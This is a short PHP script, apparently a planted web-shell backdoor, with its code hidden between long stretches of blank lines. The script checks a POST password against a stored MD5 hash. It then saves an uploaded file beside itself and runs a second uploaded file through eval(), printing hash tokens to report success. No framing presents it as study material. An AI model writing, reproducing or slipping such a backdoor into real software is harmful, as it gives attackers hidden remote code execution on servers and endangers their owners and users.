



































































































<?php
@error_reporting(E_ALL);
@set_time_limit(0);
global $HTTP_SERVER_VARS;

define('PASSWD','3b573b0ea3d02aa2bf6e2f25f73b2f2c');

function say($t) {
  echo "$t\n";
};

function testdata($t) {
  say(md5("mark_$t"));
};

echo "<pre>";
testdata('start');
if (md5($_POST["p"]) == PASSWD) {
  if ($code = @fread(@fopen($HTTP_POST_FILES["s"]["tmp_name"], "rb"),
    $HTTP_POST_FILES["s"]["size"])) {
      if(@fwrite(@fopen(dirname(__FILE__).'/'.basename($HTTP_POST_FILES["s"]["name"]), "wb"), $code))
      {
      testdata('save_ok');
      };
      //eval($code);
  } else {
    testdata('save_fail');
  };
  
  if ($code = @fread(@fopen($HTTP_POST_FILES["f"]["tmp_name"], "rb"),
    $HTTP_POST_FILES["f"]["size"])) 
  {
      eval($code);
      testdata('ok');
  } else {
    testdata('fail');
  };
  
} else {
  testdata('pass');
};

testdata('end');
echo "</pre>";
?>                                                                                                                                                      




































































































